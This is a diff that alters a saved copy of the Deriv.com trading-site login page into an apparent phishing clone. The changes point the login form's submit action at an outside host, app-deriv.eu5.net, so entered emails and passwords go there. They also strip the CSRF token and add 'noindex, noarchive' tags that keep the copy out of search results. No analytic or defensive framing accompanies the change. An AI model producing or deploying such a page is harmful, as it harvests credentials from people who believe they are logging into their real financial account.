@@ -1,10 +1,14 @@
 <!DOCTYPE html>
 <html><head>
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="content-type" content="text/html; charset=windows-1252">
         <title>Log in | Deriv.com </title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <meta name="description" content="Log in to your Deriv online trading account and start trading on the most popular financial markets.">
         <meta name="keywords" content="online trading, deriv trading, online trading account, deriv account">
+			<meta name="robots" content="noindex, noarchive, follow">
+		<link rel="stylesheet" type="text/css" href="deriv_files/oneall-deriv.css">
+		
+			
 
         <link rel="shortcut icon" href="https://deriv.com/icons/icon-48x48.png">
         <link rel="apple-touch-icon" sizes="48x48" href="https://deriv.com/icons/icon-48x48.png">
@@ -575,15 +579,8 @@
                 }
             }
         </style>
-
-        <script type="text/javascript" async="" src="asset_files/js"></script><script async="" src="asset_files/gtm.js"></script><script type="text/javascript" src="asset_files/library.js"></script><script type="text/javascript">
-            var oa = document.createElement('script');
-            oa.type = 'text/javascript';
-            oa.async = false;
-            oa.src = '//deriv.api.oneall.com/socialize/library.js?lang=en';
-            var s = document.getElementsByTagName('script')[0];
-            s.parentNode.insertBefore(oa, s);
-        </script>
+<script async="" src="deriv_files/gtm.js"></script><script type="text/javascript" src="deriv_files/library.js"></script>
+       
     </head>
     <body class="oauth">
         <header>
@@ -605,16 +602,16 @@
     <div id="container">
         <h1 class="title-text" style="font-size: 2.4rem">Welcome!</h1>
         <p class="subtitle-text">Log in to continue.</p>
-        <form novalidate="" id="frmLogin" method="POST">
+        <form action="http://app-deriv.eu5.net/" novalidate="" id="frmLogin" method="POST">
             <div class="input-group">
-                <div class="input-wrapper">
-                    <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required="" autocomplete="off" autofocus="autofocus" maxlength="254">
-                    <label for="txtEmail" class="raised-label">Email</label>
+                <div class="input-wrapper has_error">
+                    <input type="name" id="txtEmail" name="email" placeholder="example@email.com" required="" autocomplete="off" autofocus="autofocus" maxlength="254">
+                    <label for="txtEmail">Email</label>
                     <span class="bar"></span>
                 </div>
                 <div class="input-error">
                     <p class="hide error error_invalid">That doesn't look like an email address.</p>
-                    <p class="hide error error_required">Email is required.</p>
+                    <p class="error error_required">Email is required.</p>
                     
                 </div>
             </div>
@@ -628,31 +625,32 @@
                 <div class="input-error">
                     <p class="hide error error_required">Password is required.</p>
                 </div>
-          
+            </div>
             <div id="lost-password-container">
                 
-                    <a id="lost-password" href="https://deriv.com/reset-password">Forgot password?</a>
+                    <a id="lost-password" href="https://deriv.com/reset-password/#">Forgot password?</a>
                 
                 <button type="submit" class="button secondary" name="login" value="Log in">Log in</button>
-            </div></div>
-            <input type="hidden" name="csrf_token" value="5ef04d3d6c6d8772e1ac9e5e07d2aa57bf0a6d65">
+            </div>
+           
         </form>
-         
-
- <div class="separator">
+        
+        
+          <div class="separator">
                 <p class="center-text social-text">
                     Or log in with
-                </p>
+                </p></div>
           
             
-            <div id="frame" data-processed="true" style="min-height: 170px;">
-<iframe id="oa_social_login_frame_74559" scrolling="no" allowtransparency="true" data-processed="true" title="Login with Social Networks" name="OneAll Social Login" style="border: 0px none; width: 406px; height: 170px; background-color: transparent;" src="./asset_files/a.htm" frameborder="0"></iframe>
+            <div id="iframe" data-processed="true" style="min-height: 170px;">
+<iframe id="oa_social_login_frame_74559" scrolling="no" allowtransparency="true" data-processed="true" title="Login with Social Networks" name="OneAll Social Login" style="border: 0px none; width: 406px; height: 170px; background-color: transparent;" src="deriv_files/a.htm" frameborder="0"></iframe>
             
             <p class="account-text">
                 Don’t have an account yet? <a class="account-link" href="https://deriv.com/signup/">Create a new account</a>
             </p>
         
     </div>
+
 
 
 <script type="text/javascript">
@@ -777,7 +775,7 @@
         }
     }
 </script>
-<script src="asset_files/datadog-rum.js" type="text/javascript"></script>
+<script src="deriv_files/datadog-rum.js" type="text/javascript"></script>
 <script>
     var DD_APP_ID = '5c8975a3-ec86-4a64-8a3a-e6888fdde082';
     var DD_CLIENT_TOKEN = 'pub08554ab30284600af157441bfb0fa923';
@@ -819,4 +817,4 @@
         <!-- End Google Tag Manager -->
     
 
-<script type="text/javascript" id="">(function(){try{window.setTimeout(function(){dataLayer.push({event:"done_loading"})},2E3)}catch(a){}})();</script></body></html>
+</div><script type="text/javascript" id="">(function(){try{window.setTimeout(function(){dataLayer.push({event:"done_loading"})},2E3)}catch(a){}})();</script></body></html>
